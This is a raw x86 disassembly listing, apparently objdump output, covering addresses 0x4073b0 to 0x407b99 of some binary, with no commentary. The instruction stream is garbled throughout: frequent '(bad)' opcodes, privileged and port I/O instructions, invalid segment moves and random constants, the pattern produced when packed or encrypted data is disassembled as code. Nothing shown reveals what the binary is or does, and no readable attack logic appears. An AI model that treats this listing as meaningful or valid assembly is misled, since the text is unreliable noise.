  4073b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073b1:	imul   ecx,DWORD PTR [edi+ecx*1+0x0],0x0
  4073b6:	rcl    BYTE PTR [ebx+0x18e42a0f],1
  4073bc:	arpl   WORD PTR ds:[edx-0x3e],di
  4073c0:	por    mm1,mm6
  4073c3:	test   al,0x2b
  4073c5:	pop    ds
  4073c6:	cmp    bl,ah
  4073c8:	mov    ds:0xacaf7db2,al
  4073cd:	mov    ?,WORD PTR [ecx+0x5a]
  4073d0:	xchg   edx,eax
  4073d1:	aam    0xf4
  4073d3:	rcr    BYTE PTR [edi],1
  4073d5:	ins    BYTE PTR es:[edi],dx
  4073d6:	jp     0x407398
  4073d8:	lods   al,BYTE PTR ds:[esi]
  4073d9:	add    BYTE PTR [eax],al
  4073db:	mov    edx,0x15fd093e
  4073e0:	or     DWORD PTR [ecx+0x1e],eax
  4073e3:	dec    esi
  4073e4:	iret   
  4073e5:	mov    bl,0xd5
  4073e7:	repnz cmp ch,BYTE PTR [edi+0x58]
  4073eb:	push   ss
  4073ec:	xor    al,0xee
  4073ee:	pop    ebp
  4073ef:	mov    edx,0xbdfa7439
  4073f4:	cmp    al,0xb6
  4073f6:	push   ss
  4073f7:	and    dh,BYTE PTR [edx-0x32a2b98]
  4073fd:	(bad)  
  4073fe:	push   edi
  4073ff:	dec    ebp
  407400:	and    dh,BYTE PTR [edi-0x38a08d15]
  407406:	clc    
  407407:	mov    bl,0xc4
  407409:	mov    ds:0x1ac0000,eax
  40740e:	xchg   ecx,eax
  40740f:	mov    bl,0xf3
  407411:	push   ebp
  407412:	mov    bh,0x84
  407414:	and    BYTE PTR [eax],al
  407416:	add    BYTE PTR [edx],dl
  407418:	lahf   
  407419:	daa    
  40741a:	fsubr  QWORD PTR [esi-0x46]
  40741d:	mov    edi,0x9712631c
  407422:	std    
  407423:	or     al,0x48
  407425:	add    BYTE PTR [eax],al
  407427:	xchg   ebx,eax
  407428:	mov    esi,0x632dbac
  40742d:	cmc    
  40742e:	push   ss
  40742f:	mov    edx,0xb17f0a27
  407434:	mov    cl,0x81
  407436:	daa    
  407437:	or     BYTE PTR [eax],ah
  407439:	add    BYTE PTR [eax],al
  40743b:	xor    al,0x89
  40743d:	dec    ebp
  40743e:	(bad)  
  40743f:	adc    ch,0xb5
  407442:	hlt    
  407443:	mov    esi,0xe504
  407448:	pusha  
  407449:	dec    esi
  40744a:	or     BYTE PTR [esi+0x4c800000],dl
  407450:	add    BYTE PTR [eax],al
  407452:	mov    bl,0x68
  407454:	mov    al,ds:0xe0154746
  407459:	fnstcw WORD PTR [ecx+0x52]
  40745c:	(bad)  
  40745d:	xor    al,0x2
  40745f:	sbb    ah,dl
  407461:	or     DWORD PTR [ecx-0x4c],edi
  407464:	je     0x4074c9
  407466:	mov    esp,0xb1667be0
  40746b:	dec    esp
  40746c:	add    DWORD PTR [eax],eax
  40746e:	add    BYTE PTR ds:0xdd4e3bf7,bh
  407474:	or     DWORD PTR [esi*2+0x75fb9a4b],esi
  40747b:	or     DWORD PTR [ebp+0x69716098],edi
  407481:	out    dx,eax
  407482:	lahf   
  407483:	mov    bh,0xc5
  407485:	(bad)  
  407486:	(bad)  [edx+0x2f]
  407489:	hlt    
  40748a:	mov    ah,0x72
  40748c:	jnp    0x407481
  40748e:	shl    ebp,cl
  407490:	inc    eax
  407491:	sti    
  407492:	add    BYTE PTR [eax],al
  407494:	mov    ds:0xbfaa3367,al
  407499:	ror    BYTE PTR [ecx+esi*1],1
  40749c:	add    BYTE PTR [eax],al
  40749e:	and    BYTE PTR [ebx-0x440736d4],bh
  4074a4:	(bad)  
  4074a5:	mov    ch,0x50
  4074a7:	mov    ebp,0xbb10c12e
  4074ac:	leave  
  4074ad:	ret    0xaf56
  4074b0:	mov    al,0x75
  4074b2:	mov    al,ds:0xfa0b0e7c
  4074b7:	mov    edi,0xf28b3071
  4074bc:	jmp    0x407503
  4074be:	pop    edx
  4074bf:	out    dx,al
  4074c0:	ins    DWORD PTR es:[edi],dx
  4074c1:	push   cs
  4074c2:	inc    ebp
  4074c3:	ret    
  4074c4:	pop    esp
  4074c5:	sub    BYTE PTR [edx+0x5],cl
  4074c8:	cmp    edi,DWORD PTR [esi]
  4074ca:	inc    edi
  4074cb:	icebp  
  4074cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074cd:	cli    
  4074ce:	out    0xd1,eax
  4074d0:	div    DWORD PTR [ebx-0x1c]
  4074d3:	push   es
  4074d4:	xor    edi,DWORD PTR [edx+0x7360f971]
  4074da:	push   cs
  4074db:	xor    eax,0x794547b4
  4074e0:	stc    
  4074e1:	rcl    edi,cl
  4074e3:	out    dx,eax
  4074e4:	test   BYTE PTR [ebp-0x67fb0000],ch
  4074ea:	cmp    bh,BYTE PTR [edi+0x7c432070]
  4074f0:	test   BYTE PTR ds:0xf6ba0000,ah
  4074f6:	sub    eax,0x71753438
  4074fb:	mov    eax,0xdf44
  407500:	inc    edi
  407501:	aad    0x2a
  407503:	sub    DWORD PTR [ebx],0xffffffe7
  407506:	xchg   ebx,eax
  407507:	sbb    DWORD PTR [ebx],ecx
  407509:	dec    ebx
  40750a:	mov    edx,0xf4e8d6da
  40750f:	push   ds
  407510:	jbe    0x40753d
  407512:	xor    eax,0xa4cfbae0
  407517:	retf   
  407518:	mov    eax,0x74c8ca
  40751d:	add    BYTE PTR [eax+0x41415c37],bh
  407523:	jns    0x40750e
  407525:	test   esi,0xe116dcbb
  40752b:	bound  ebp,QWORD PTR [esi+0x28]
  40752e:	cmp    al,0xd9
  407530:	test   eax,0x2e94890d
  407535:	mov    WORD PTR [edx-0x17f0000],fs
  40753b:	ss pop eax
  40753d:	mov    eax,ds:0xe4ca376
  407542:	add    BYTE PTR [eax],al
  407544:	xor    cl,0x10
  407547:	jo     0x407542
  407549:	icebp  
  40754a:	add    al,0x44
  40754c:	add    BYTE PTR [eax],al
  40754e:	stos   DWORD PTR es:[edi],eax
  40754f:	adc    DWORD PTR [edx],ebx
  407551:	mov    eax,0xbdf81a12
  407556:	cmp    dl,BYTE PTR [edi+0x1d16cf16]
  40755c:	mov    bl,BYTE PTR [ebx-0x4b]
  40755f:	sti    
  407560:	or     eax,0x39ef0eac
  407565:	(bad)  
  407566:	repnz add bh,BYTE PTR [eax-0x52c16159]
  40756d:	and    al,0xdf
  40756f:	(bad)  
  407570:	sub    edi,ebp
  407572:	xor    eax,0x17b193ee
  407577:	mov    esi,0x7aba81d7
  40757c:	repz jg 0x4075d4
  40757f:	cmp    dl,BYTE PTR [eax-0x23fce52e]
  407585:	mov    ?,WORD PTR [ebx]
  407587:	push   ds
  407588:	repz and al,0x99
  40758b:	xor    dh,BYTE PTR [ebx-0xf0396b7]
  407591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407592:	in     eax,dx
  407593:	pop    ecx
  407594:	and    DWORD PTR [ebp-0x48],eax
  407597:	or     ah,BYTE PTR [ecx+0x64c22c52]
  40759d:	sahf   
  40759e:	cmp    edi,esi
  4075a0:	adc    eax,0x3c8035eb
  4075a5:	add    BYTE PTR [eax],al
  4075a7:	cmp    al,0xe7
  4075a9:	mov    esi,0xc10493b2
  4075ae:	add    BYTE PTR [eax],al
  4075b0:	adc    eax,0x3420d5a3
  4075b5:	(bad)  
  4075b6:	rep stos BYTE PTR es:[edi],al
  4075b8:	pop    ebx
  4075b9:	xchg   edx,eax
  4075ba:	xchg   ebx,eax
  4075bb:	inc    ecx
  4075bc:	adc    eax,0x3b4d76ad
  4075c1:	add    eax,0xa3b789b8
  4075c6:	repz fbld TBYTE PTR [ebx-0x50]
  4075ca:	jns    0x4075ba
  4075cc:	cmp    esi,DWORD PTR [ebx+0x22]
  4075cf:	stos   DWORD PTR es:[edi],eax
  4075d0:	xor    ch,dh
  4075d2:	not    BYTE PTR [ebx+0x1bcc0d]
  4075d8:	add    cl,dh
  4075da:	arpl   cx,bx
  4075dc:	lea    ecx,[esp+esi*8+0x11c40000]
  4075e3:	add    BYTE PTR [eax],al
  4075e5:	(bad)  
  4075e6:	dec    esi
  4075e7:	idiv   BYTE PTR [ebp+esi*1+0xff8c]
  4075ee:	sbb    dl,ch
  4075f0:	mov    bl,0xd0
  4075f2:	icebp  
  4075f3:	pop    edi
  4075f4:	shr    edx,0x79
  4075f7:	mov    ?,WORD PTR ds:0xec4cb7b1
  4075fd:	add    BYTE PTR [eax],al
  4075ff:	sahf   
  407600:	xchg   ecx,eax
  407602:	fmul   QWORD PTR ds:0x6bc8
  407608:	inc    ecx
  407609:	loope  0x4075da
  40760b:	mov    esp,0xaa84
  407610:	mov    al,ds:0xab411ab3
  407615:	ja     0x40763d
  407617:	repnz scas eax,DWORD PTR es:[edi]
  407619:	mov    al,ds:0x39c77e7c
  40761e:	retf   
  40761f:	mov    dh,0x62
  407621:	dec    esi
  407622:	jbe    0x407616
  407624:	mov    bh,ah
  407626:	add    BYTE PTR [eax],al
  407628:	adc    al,0x8c
  40762a:	adc    eax,0xaa340000
  40762f:	mov    dl,0x4c
  407631:	mov    bl,0x0
  407633:	add    BYTE PTR [eax+0x79],bl
  407636:	into   
  407637:	adc    al,0x7a
  407639:	cmp    esi,ecx
  40763b:	test   eax,0x24111be
  407640:	jge    0x407682
  407642:	rol    DWORD PTR [eax],0x0
  407645:	es inc edx
  407647:	mov    dh,0xb3
  407649:	js     0x40765a
  40764b:	add    BYTE PTR [ecx],bl
  40764d:	add    BYTE PTR [eax],al
  40764f:	xchg   ebp,eax
  407650:	or     DWORD PTR [eax+0x25],ebx
  407653:	add    al,0x7
  407655:	add    BYTE PTR [eax],al
  407657:	cs loopne 0x4075f7
  40765a:	add    al,bh
  40765c:	push   ebx
  40765d:	mov    esp,0x401ab898
  407662:	add    DWORD PTR [eax],0xbd741d00
  407668:	repnz fcom st(2)
  40766b:	ss mov ch,0x15
  40766e:	jns    0x407608
  407670:	ja     0x407661
  407672:	iret   
  407673:	iret   
  407674:	xor    bl,dh
  407676:	mov    WORD PTR [eax],ds
  407678:	add    BYTE PTR [eax],al
  40767a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40767b:	xor    dl,BYTE PTR [edx+0x5fa215a2]
  407681:	jns    0x407634
  407683:	mov    dh,0x65
  407685:	test   BYTE PTR [esi],al
  407687:	add    BYTE PTR [eax],al
  407689:	add    dh,BYTE PTR [edx]
  40768b:	in     al,0xc
  40768d:	cmp    eax,DWORD PTR [eax]
  40768f:	add    BYTE PTR [edi+0x914ca7],bl
  407695:	add    BYTE PTR [esi-0x253284c8],bl
  40769b:	jp     0x407624
  40769d:	adc    ecx,DWORD PTR [esi+0x3]
  4076a0:	repnz cld 
  4076a2:	mov    bl,0xc1
  4076a4:	mov    bh,0x26
  4076a6:	cmp    al,BYTE PTR [ebx+0x73]
  4076a9:	mov    eax,0x68ed7dad
  4076ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076af:	push   esp
  4076b0:	mov    ds:0xb93cb349,al
  4076b5:	inc    ebp
  4076b6:	cmc    
  4076b7:	mov    ah,0xcc
  4076b9:	retf   
  4076ba:	add    BYTE PTR [eax],al
  4076bc:	out    dx,al
  4076bd:	loop   0x4076c7
  4076bf:	jmp    0x9f4076c4
  4076c4:	add    BYTE PTR [eax],al
  4076c6:	in     al,0x38
  4076c8:	dec    ebp
  4076c9:	and    ebp,esp
  4076cb:	jnp    0x4076f8
  4076cd:	test   eax,0x759b4ac7
  4076d2:	ret    
  4076d3:	pop    esi
  4076d4:	inc    ch
  4076d6:	xchg   edx,eax
  4076d7:	ss aam 0x76
  4076da:	sbb    eax,0x2f5e1b9
  4076df:	cmp    al,0x78
  4076e1:	mov    bh,0x34
  4076e3:	cli    
  4076e4:	gs add al,0x3e
  4076e7:	add    BYTE PTR [eax],al
  4076e9:	inc    edx
  4076ea:	mov    bh,0x57
  4076ec:	push   eax
  4076ed:	xchg   edi,eax
  4076ee:	or     bh,BYTE PTR [edi-0x76c36f0]
  4076f4:	jno    0x40773e
  4076f6:	xlat   BYTE PTR ds:[ebx]
  4076f7:	add    BYTE PTR [eax],al
  4076f9:	or     DWORD PTR [ecx+0x80089],edx
  4076ff:	add    BYTE PTR [esi],ah
  407701:	mov    dh,0x66
  407703:	mov    al,ds:0x84f81f4d
  407708:	inc    ebp
  407709:	add    BYTE PTR [eax],al
  40770b:	pop    esi
  40770c:	fisttp WORD PTR [esp+eiz*2]
  40770f:	add    BYTE PTR [eax],al
  407711:	push   cs
  407712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407713:	cmp    bl,dh
  407715:	fs stc 
  407717:	pop    edx
  407718:	cmc    
  407719:	lods   eax,DWORD PTR ds:[esi]
  40771a:	push   ebp
  40771b:	xor    cl,BYTE PTR [esi+0x4f]
  40771e:	jb     0x40777c
  407720:	clc    
  407721:	mov    ebx,0xe2835934
  407726:	cmc    
  407727:	pop    ecx
  407728:	daa    
  407729:	sub    bl,0x0
  40772c:	add    BYTE PTR [ecx],dh
  40772e:	sbb    ebx,DWORD PTR [eax-0x75]
  407731:	into   
  407732:	jg     0x407744
  407734:	out    0xfa,al
  407736:	xchg   BYTE PTR [edi+0x4c412c93],dh
  40773c:	sub    al,0x0
  40773e:	add    BYTE PTR [eax-0xffffb7],al
  407744:	inc    edx
  407745:	and    eax,0x7a847a6b
  40774a:	add    BYTE PTR [eax],al
  40774c:	not    BYTE PTR [ebp+0x6599dd3a]
  407752:	cld    
  407753:	sub    edi,DWORD PTR [edx+0x7a6d35eb]
  407759:	mov    ebp,0x6dcc
  40775e:	cwde   
  40775f:	mov    DWORD PTR [esi+0x2a24fe5b],ecx
  407765:	cmp    ah,ch
  407767:	adc    cl,BYTE PTR [esi+ebx*2+0x0]
  40776b:	add    BYTE PTR [ecx],ch
  40776d:	(bad)  
  40776e:	mov    ah,0x4d
  407770:	je     0x407752
  407772:	or     BYTE PTR [edx],al
  407774:	add    BYTE PTR [eax],al
  407776:	out    dx,al
  407777:	clc    
  407778:	sub    DWORD PTR [ebp+0x21a2b2f1],0x3b
  40777f:	sub    DWORD PTR [ecx],esp
  407781:	dec    ebx
  407782:	shl    DWORD PTR [ebx*4+0x657960b1],0x5
  40778a:	and    dh,BYTE PTR [edi-0x153f0b4f]
  407790:	add    BYTE PTR [eax],al
  407792:	mov    dh,0x39
  407794:	repz dec ecx
  407796:	jae    0x407772
  407798:	icebp  
  407799:	dec    ebp
  40779a:	mov    edi,0x79d5b99a
  40779f:	shr    DWORD PTR [eax],0x3d
  4077a2:	lods   eax,DWORD PTR ds:[esi]
  4077a3:	add    cl,BYTE PTR [esi+0x356686a0]
  4077a9:	(bad)  
  4077aa:	cmp    bh,BYTE PTR [esi-0x7b8d2d82]
  4077b0:	iret   
  4077b1:	add    BYTE PTR [eax],al
  4077b3:	scas   eax,DWORD PTR es:[edi]
  4077b4:	out    dx,al
  4077b5:	dec    esi
  4077b6:	pop    esp
  4077b7:	mov    ebx,DWORD PTR ds:0xe3cc
  4077bd:	push   0xffffffef
  4077bf:	pop    ds
  4077c0:	retf   
  4077c1:	mov    ebp,DWORD PTR [edx]
  4077c3:	jb     0x4077cd
  4077c5:	ins    DWORD PTR es:[edi],dx
  4077c6:	add    BYTE PTR [eax],al
  4077c8:	jns    0x407766
  4077ca:	(bad)  
  4077cb:	pop    ebp
  4077cc:	cli    
  4077cd:	jns    0x407840
  4077cf:	in     eax,dx
  4077d0:	icebp  
  4077d1:	jmp    0x4077fe
  4077d3:	std    
  4077d4:	test   DWORD PTR [ebp+0x65dba7d8],esi
  4077da:	(bad)  
  4077db:	retf   
  4077dc:	inc    edi
  4077dd:	inc    eax
  4077de:	mov    bl,0x0
  4077e0:	add    ch,dh
  4077e2:	fdivr  st,st(7)
  4077e4:	js     0x4077ce
  4077e6:	cmp    edi,edx
  4077e8:	mov    ah,0x97
  4077ea:	mov    eax,0x14482f
  4077ef:	add    ch,ah
  4077f1:	jp     0x407840
  4077f3:	int    0x9c
  4077f5:	mov    ah,0xe2
  4077f7:	imul   ebx,DWORD PTR ds:0x8ee5a4bf,0xffffffb9
  4077fe:	push   edi
  4077ff:	pop    es
  407800:	and    BYTE PTR [eax],bh
  407802:	xchg   ebp,eax
  407803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407804:	xor    eax,0xf2da2c38
  407809:	mov    ch,0xbf
  40780b:	jbe    0x4077f0
  40780d:	dec    ebx
  40780e:	sbb    al,BYTE PTR [edi]
  407810:	int    0xb1
  407812:	pop    ebx
  407813:	xchg   edx,eax
  407814:	sub    al,0xbf
  407816:	and    DWORD PTR [edx-0x64],edi
  407819:	mov    edx,0x5e143261
  40781e:	pop    edx
  40781f:	ja     0x40787e
  407821:	jo     0x40788e
  407823:	xchg   BYTE PTR [eax+0x79],al
  407826:	add    BYTE PTR [eax],al
  407828:	and    eax,DWORD PTR [ebx-0x64]
  40782b:	int    0xba
  40782d:	cmc    
  40782e:	js     0x407887
  407830:	mov    ch,0x1a
  407832:	pop    es
  407833:	lds    esi,FWORD PTR [edi-0x7542ad91]
  407839:	jbe    0x4078ba
  40783b:	clc    
  40783c:	mov    ebx,0x9b897e8
  407841:	push   0x61c1579b
  407846:	sbb    BYTE PTR [esi],bh
  407848:	and    BYTE PTR cs:[ebp+0x2d1ec514],dh
  40784f:	cs xor ah,dl
  407852:	jno    0x4078bf
  407854:	bound  ecx,QWORD PTR ds:0x6932b56a
  40785a:	lods   eax,DWORD PTR ds:[esi]
  40785b:	bound  esi,QWORD PTR ds:0x5a9d8986
  407861:	outs   dx,BYTE PTR ds:[esi]
  407862:	mov    edx,0xf4aee533
  407867:	jo     0x4078df
  407869:	leave  
  40786a:	ins    DWORD PTR es:[edi],dx
  40786b:	sub    cl,BYTE PTR [bx+si+0xd5]
  407870:	add    BYTE PTR [esi+ebx*8-0x70],dl
  407874:	and    BYTE PTR [ebp-0x3fd881f],0xa5
  40787b:	add    esi,eax
  40787d:	jg     0x407815
  40787f:	pop    esp
  407880:	je     0x407861
  407882:	jle    0x407888
  407884:	inc    ecx
  407885:	add    BYTE PTR [eax],al
  407887:	inc    ebx
  407888:	jg     0x407840
  40788a:	jmp    0x33bb:0x7362306e
  407891:	ret    
  407892:	je     0x407867
  407894:	bound  ebx,QWORD PTR [bx+di-0x43d9]
  407899:	aas    
  40789a:	mov    WORD PTR [ebp-0x25d80000],ds
  4078a0:	in     eax,dx
  4078a1:	xchg   ebx,eax
  4078a2:	je     0x4078e2
  4078a4:	data16 xor bl,BYTE PTR [edi+0x37]
  4078a8:	sbb    bh,al
  4078aa:	cwde   
  4078ab:	pop    ss
  4078ac:	cmp    ah,dh
  4078ae:	jbe    0x4078a6
  4078b0:	fdiv   DWORD PTR [edi]
  4078b2:	into   
  4078b3:	add    cl,0xcf
  4078b6:	xor    al,0xdc
  4078b8:	rol    BYTE PTR [ecx],cl
  4078ba:	sub    DWORD PTR ds:0xd683ee32,0x71
  4078c1:	lock xor eax,0x837169e
  4078c7:	rol    BYTE PTR [eax],cl
  4078c9:	add    BYTE PTR [ebp+0xc7cc],al
  4078cf:	xchg   edx,eax
  4078d0:	mov    ebx,0xf7f85939
  4078d5:	popa   
  4078d6:	cmp    esi,esp
  4078d8:	add    al,0x8c
  4078da:	add    BYTE PTR [eax],al
  4078dc:	cmc    
  4078dd:	pushf  
  4078de:	int    0xf6
  4078e0:	loope  0x407899
  4078e2:	cmp    esp,esp
  4078e4:	jne    0x407920
  4078e6:	mov    al,ds:0xa390f36f
  4078eb:	int3   
  4078ec:	cmp    BYTE PTR [eax],al
  4078ee:	add    cl,dh
  4078f0:	xchg   edi,eax
  4078f1:	mov    BYTE PTR [eax+0x0],dl
  4078f4:	add    BYTE PTR [ebx],bh
  4078f6:	sti    
  4078f7:	jb     0x4078ad
  4078f9:	in     al,dx
  4078fa:	inc    edx
  4078fb:	retf   0x3488
  4078fe:	add    BYTE PTR [eax],al
  407900:	sbb    BYTE PTR [eax+0x6f],al
  407903:	add    BYTE PTR [eax],al
  407905:	int    0x88
  407907:	push   0x0
  407909:	add    BYTE PTR [ecx],ah
  40790b:	inc    eax
  40790c:	add    al,BYTE PTR [eax]
  40790e:	add    ah,dh
  407910:	leave  
  407911:	xor    esi,0x3f6c666e
  407917:	(bad)  
  407918:	mov    al,ch
  40791a:	add    BYTE PTR [eax],al
  40791c:	in     al,dx
  40791d:	repz sub BYTE PTR [ebx-0x54],ah
  407921:	add    bl,BYTE PTR [ebp-0x75]
  407924:	jno    0x407919
  407926:	jmp    0x248f:0x41f6acf4
  40792d:	inc    eax
  40792e:	dec    edx
  40792f:	add    BYTE PTR [eax],al
  407931:	in     eax,0x24
  407933:	cmp    bh,cl
  407935:	stos   DWORD PTR es:[edi],eax
  407936:	xor    eax,0xf4e6f931
  40793b:	mov    ebx,edi
  40793d:	cmp    eax,0xfb04f4
  407942:	add    dl,ch
  407944:	mov    al,ds:0x27f4c122
  407949:	cmp    BYTE PTR [ecx-0xc],dh
  40794c:	ret    0x55f3
  40794f:	neg    BYTE PTR [ecx]
  407951:	mov    al,0xc4
  407953:	fild   WORD PTR [eax]
  407955:	add    bh,ch
  407957:	pop    esp
  407958:	cmp    esp,DWORD PTR [ebp-0xd]
  40795b:	ret    
  40795c:	or     al,0x2a
  40795e:	add    BYTE PTR [eax],al
  407960:	jg     0x407957
  407962:	mov    esi,0x15f71549
  407967:	mov    al,0x6d
  407969:	add    bh,BYTE PTR [esi-0x20011131]
  40796f:	push   cs
  407970:	pop    edi
  407971:	cmc    
  407972:	cmp    dh,BYTE PTR [ebx-0x29]
  407975:	out    dx,eax
  407976:	xchg   ecx,eax
  407977:	dec    ecx
  407978:	jb     0x40796f
  40797a:	xor    al,0xbf
  40797c:	lock mov dl,bl
  40797f:	add    BYTE PTR [eax],al
  407981:	lea    eax,[ebx+0x5f]
  407984:	cmc    
  407985:	ss jae 0x407934
  407988:	test   dl,al
  40798a:	add    BYTE PTR [eax],al
  40798c:	(bad)
  407990:	add    BYTE PTR [edx-0xd],dl
  407993:	jo     0x407953
  407995:	int3   
  407996:	mov    ah,0x0
  407998:	add    ch,ch
  40799a:	ja     0x407923
  40799c:	inc    eax
  40799d:	push   edi
  40799e:	add    BYTE PTR [eax],al
  4079a0:	add    DWORD PTR [ebx-0x79],edx
  4079a3:	in     al,dx
  4079a4:	inc    edx
  4079a5:	stos   BYTE PTR es:[edi],al
  4079a6:	mov    BYTE PTR [edx+0x40180000],dh
  4079ac:	mov    ds:0x88ad0000,eax
  4079b1:	aad    0x0
  4079b3:	add    BYTE PTR [ecx],ah
  4079b5:	inc    eax
  4079b6:	into   
  4079b7:	add    BYTE PTR [eax],al
  4079b9:	aam    0xc9
  4079bb:	cmp    ecx,0xed6c6e4e
  4079c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079c2:	mov    BYTE PTR ds:0x40230000,ah
  4079c8:	sahf   
  4079c9:	add    BYTE PTR [eax],al
  4079cb:	or     DWORD PTR [esi],edi
  4079cd:	shr    bl,1
  4079cf:	scas   eax,DWORD PTR es:[edi]
  4079d0:	add    DWORD PTR [ecx+0x42],eax
  4079d3:	retf   
  4079d4:	addr16 xchg ebx,eax
  4079d6:	in     eax,dx
  4079d7:	and    DWORD PTR [esi-0x1c3b1651],esi
  4079dd:	add    BYTE PTR [eax],al
  4079df:	ss cmp dl,dh
  4079e2:	mov    edi,DWORD PTR [ebx]
  4079e4:	inc    ecx
  4079e5:	inc    edx
  4079e6:	(bad)  
  4079e7:	addr16 pop eax
  4079e9:	clc    
  4079ea:	sbb    eax,0xc18475f9
  4079ef:	add    BYTE PTR [eax],al
  4079f1:	jb     0x4079a3
  4079f3:	cmp    bh,dl
  4079f5:	pop    es
  4079f6:	xor    cl,al
  4079f8:	clc    
  4079f9:	mov    ds:0xf9eb576b,al
  4079fe:	xor    BYTE PTR [eax-0x14],dh
  407a01:	cmp    al,0xf8
  407a03:	fs hlt 
  407a05:	mov    ds:0x688c,eax
  407a0a:	int    0xf3
  407a0c:	sahf   
  407a0d:	leave  
  407a0e:	xchg   edi,eax
  407a0f:	lock cmc 
  407a11:	xor    BYTE PTR [ebp-0x52062a56],bh
  407a17:	sub    al,0x4b
  407a19:	jnp    0x407a1c
  407a1b:	std    
  407a1c:	sbb    ch,BYTE PTR [eax-0x29]
  407a1f:	cmc    
  407a20:	jno    0x407a55
  407a22:	sbb    bh,al
  407a24:	adc    al,0xc6
  407a26:	int    0xee
  407a28:	mov    al,ds:0x16fd0169
  407a2d:	push   0x6c6aae3d
  407a32:	cmp    ah,BYTE PTR [edi]
  407a34:	push   ecx
  407a35:	ror    ebp,0x27
  407a38:	pop    eax
  407a39:	ins    BYTE PTR es:[edi],dx
  407a3a:	sbb    DWORD PTR [eax*2-0x75bd1394],0x2188
  407a45:	sbb    ah,al
  407a47:	out    0x0,al
  407a49:	add    BYTE PTR [ecx+0xfc88],cl
  407a4f:	cmp    ecx,DWORD PTR [eax]
  407a51:	xchg   BYTE PTR [eax],al
  407a53:	add    BYTE PTR [ecx+0xf08c],al
  407a59:	add    DWORD PTR [edx],0x83cc
  407a5f:	ins    BYTE PTR es:[edi],dx
  407a60:	ins    BYTE PTR es:[edi],dx
  407a61:	or     BYTE PTR [ecx-0x7aa50000],bh
  407a67:	pusha  
  407a68:	loope  0x407a4f
  407a6a:	mov    ebx,DWORD PTR [eax]
  407a6c:	dec    ecx
  407a6d:	sbb    eax,0x8b39712a
  407a72:	int    0xac
  407a74:	test   DWORD PTR [ecx],0x580cfd85
  407a7a:	add    BYTE PTR [eax],al
  407a7c:	xchg   edi,eax
  407a7d:	loopne 0x407aad
  407a7f:	mov    ecx,0x393107b0
  407a84:	xchg   ebp,ecx
  407a86:	jge    0x407a80
  407a88:	std    
  407a89:	jns    0x407ac8
  407a8b:	sbb    edx,DWORD PTR [ebx-0x7]
  407a8e:	(bad)  
  407a8f:	ret    
  407a90:	sbb    DWORD PTR [ebp+0x71],edi
  407a93:	or     bp,0xffc8
  407a97:	pop    edi
  407a98:	add    BYTE PTR [eax],al
  407a9a:	mov    bh,0xd6
  407a9c:	xor    al,ch
  407a9e:	daa    
  407a9f:	sbb    eax,0x48b7b1b1
  407aa4:	add    BYTE PTR es:[eax],al
  407aa7:	test   bh,dh
  407aa9:	add    BYTE PTR [eax],al
  407aab:	popa   
  407aac:	ret    
  407aad:	xor    BYTE PTR [esp+ecx*8+0x4fc80000],al
  407ab4:	add    BYTE PTR [eax],al
  407ab6:	mov    bh,0xd2
  407ab8:	xor    BYTE PTR [ecx],bl
  407aba:	mov    edi,0xbf31f8ca
  407abf:	xor    DWORD PTR [eax+0x61000072],ecx
  407ac5:	ret    
  407ac6:	lods   al,BYTE PTR ds:[esi]
  407ac7:	lahf   
  407ac8:	sub    BYTE PTR [edi-0x28],al
  407acb:	xor    cl,cl
  407acd:	mov    es,WORD PTR ds:0x688eb19c
  407ad3:	lahf   
  407ad4:	popa   
  407ad5:	ret    
  407ad6:	call   0x12cec47a
  407adb:	lahf   
  407adc:	leave  
  407add:	mov    es,WORD PTR [ecx-0x61]
  407ae0:	xor    DWORD PTR [esi+0x1784],ecx
  407ae6:	lahf   
  407ae7:	push   ds
  407ae8:	mov    ?,WORD PTR [edi+0x488e1e05]
  407aee:	jne    0x407af0
  407af0:	add    BYTE PTR ds:0x55b8e0e,al
  407af6:	mov    ?,WORD PTR cs:[edx]
  407af9:	add    eax,0x56d75be
  407afe:	mov    esi,0x6e18f9ec
  407b03:	mov    gs,WORD PTR [ebx]
  407b05:	add    eax,0x5c68e0e
  407b0a:	ds jne 0x407aee
  407b0d:	or     BYTE PTR [eax+0x0],ch
  407b10:	add    BYTE PTR [esi-0x354f3e14],bh
  407b16:	in     eax,dx
  407b17:	mov    ch,ch
  407b19:	add    BYTE PTR [eax],al
  407b1b:	mov    ds:0x3427ed15,eax
  407b20:	inc    eax
  407b21:	mov    eax,0x8be10000
  407b26:	test   eax,0x5308697d
  407b2b:	add    BYTE PTR [eax],al
  407b2d:	cmp    eax,0x21ce6ce1
  407b32:	jne    0x407b9d
  407b34:	enter  0x97,0x0
  407b38:	and    DWORD PTR [eax+0x1bae676c],esp
  407b3e:	icebp  
  407b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b40:	mov    esp,0xacdf6567
  407b45:	pop    edi
  407b46:	gs cld 
  407b48:	jo     0x407b9b
  407b4a:	daa    
  407b4b:	pop    ecx
  407b4c:	mov    eax,0x181cc37e
  407b51:	(bad)  
  407b52:	jmp    0x407b2e
  407b54:	mov    ecx,0x25666567
  407b59:	mov    esi,0x472f06f0
  407b5e:	icebp  
  407b5f:	lea    ebx,[edi+eiz*1]
  407b62:	mov    gs,edi
  407b64:	scas   al,BYTE PTR es:[edi]
  407b65:	(bad)  
  407b66:	jge    0x407b47
  407b68:	and    BYTE PTR [esi-0x18770b0f],dl
  407b6e:	add    BYTE PTR [eax],al
  407b70:	(bad)  
  407b71:	icebp  
  407b72:	cmp    eax,0x1ac2e71c
  407b77:	scas   al,BYTE PTR es:[edi]
  407b78:	iret   
  407b79:	jl     0x407b9d
  407b7b:	sbb    al,0xbf
  407b7d:	jge    0x407bb5
  407b7f:	sbb    al,0x27
  407b81:	mov    ?,WORD PTR [edx]
  407b83:	sbb    al,0x17
  407b85:	mov    fs,WORD PTR [ebx]
  407b87:	sbb    al,0x1f
  407b89:	mov    ?,WORD PTR [esi]
  407b8b:	push   esp
  407b8c:	jmp    0xadf3:0x37f3def7
  407b93:	aaa    
  407b94:	mov    ebx,ss
  407b96:	add    BYTE PTR [eax],al
  407b98:	(bad)  
  407b99:	jp     0x407b1c
